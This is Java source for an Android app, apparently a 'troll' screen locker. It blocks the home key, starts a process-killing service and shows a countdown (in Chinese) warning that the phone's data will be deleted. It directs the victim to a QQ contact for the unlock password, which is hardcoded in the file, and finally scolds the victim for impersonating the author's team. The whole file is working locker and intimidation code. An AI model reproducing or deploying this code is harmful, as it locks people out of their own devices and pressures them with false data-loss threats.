package cc.icayshorts.troll;

import android.app.*;
import android.net.Uri;
import android.os.*;
import android.view.*;
import android.widget.*;
import android.content.*;
import java.util.*;
import android.view.View.*;
import android.text.*;
import android.view.InputQueue.*;


public class MainActivity extends Activity {
	Intent intent;
	Context context;
	long usedTime = 0, newTime = 0;
	int keyTouthInt = 0;
	TextView tv_time;
	SharedPreferences sp;
	Timer timer;
	TimerTask timertask;
	int theBeginTimeToFinish = 9195;//总的时间，以秒为单位
	int timetofinish = theBeginTimeToFinish;

	/**
	 * ATTENTION: This was auto-generated to implement the App Indexing API.
	 * See https://g.co/AppIndexing/AndroidStudio for more information.
	 */
	HomeKeyLocker homeKeyLocker = new HomeKeyLocker();

//	public static final int FLAG_HOMEKEY_DISPATCHED = 0x80000000;
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		requestWindowFeature(Window.FEATURE_NO_TITLE);
		getWindow().setFlags(0x80000000, 0x80000000);
		super.onCreate(savedInstanceState);

//		this.getWindow().setFlags(FLAG_HOMEKEY_DISPATCHED,FLAG_HOMEKEY_DISPATCHED);
		//set full screen in manifest.xml
		setContentView(R.layout.main);
		Button bt= (Button) findViewById(R.id.button);
		bt.setOnClickListener(onClick);
		context = this;

		//获取控件
		tv_time = (TextView) super.findViewById(R.id.mainTextViewTime);

		//启动service
		intent = new Intent();
		intent.setClass(MainActivity.this, killpoccessserve.class);
		startService(intent);

		sp = getSharedPreferences("TimeSave", MODE_PRIVATE);

		//得到保存的时间
		timetofinish = sp.getInt("saveTime", timetofinish);
		//如果时间小于1s，则恢复原值
		if (timetofinish <= 1) {
			timetofinish = theBeginTimeToFinish;
		}
		timer = new Timer();
		homeKeyLocker.lock(this);
		timertask = new TimerTask() {
			@Override
			public void run() {
				runOnUiThread(new Runnable() {

					@Override
					public void run() {
						// TODO: Implement this method
						int hour, minute, second;
						hour = timetofinish / (1 * 60 * 60);//获取剩余的小时数
						minute = (timetofinish % (1 * 60 * 60)) / (1 * 60);//分钟数
						second = timetofinish % (1 * 60);//秒
						tv_time.setText(hour + "时" + minute + "分" + second + "秒后删除数据。");
						sp.edit().putInt("saveTime", timetofinish).commit();//保存，在程序退出或重启后能恢复
						if (timetofinish == 0)//判断剩余时间是否为0，为0退出程序
						{
							homeKeyLocker.unlock();
							AlertDialog.Builder builder2 = new AlertDialog.Builder(MainActivity.this);
							builder2.setTitle("来自你伪装的团队：");
							builder2.setMessage("以后不要伪装别人的团队了！");
							builder2.setPositiveButton("我再也不干了", new DialogInterface.OnClickListener() {
								@Override
								public void onClick(DialogInterface dialogInterface, int i) {
									stopService(intent);
									System.exit(0);
								}
							});
							builder2.show();
						}
						timetofinish--;    //时间自减1S
					}
				});
			}
		};
		timer.schedule(timertask, 0, 1000);//一秒重复一次
		// ATTENTION: This was auto-generated to implement the App Indexing API.
		// See https://g.co/AppIndexing/AndroidStudio for more information.
	}


/*	@Override
		public boolean onKeyDown(int keyCode, KeyEvent event){
		if (keyCode == event.KEYCODE_HOME){
			return true;
		}
		return super.onKeyDown(keyCode, event);
	}
	*/
	private View.OnClickListener onClick = new View.OnClickListener() {
		@Override
		public void onClick(View v) {
			AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
			final EditText edit = new EditText(context);
			edit.setHint("输入密码");
			builder.setView(edit);
			builder.setTitle("输入密码");
			builder.setMessage("解锁请加QQ1553296996");
			builder.setPositiveButton("解锁", new DialogInterface.OnClickListener() {
				@Override
				public void onClick(DialogInterface p1, int p2) {
					String getnumber = edit.getText().toString();
					if (getnumber.equals("iamsillybbaby"))//判断密码是否正确
					{
						homeKeyLocker.unlock();
						AlertDialog.Builder builder2 = new AlertDialog.Builder(MainActivity.this);
						builder2.setTitle("来自你伪装的团队：");
						builder2.setMessage("以后不要伪装别人的团队了！");
						builder2.setPositiveButton("我再也不干了", new DialogInterface.OnClickListener() {
							@Override
							public void onClick(DialogInterface dialogInterface, int i) {
								stopService(intent);
								System.exit(0);
							}
						});
						builder2.show();

					}
				}
			});
			builder.show();
		}
	};
}



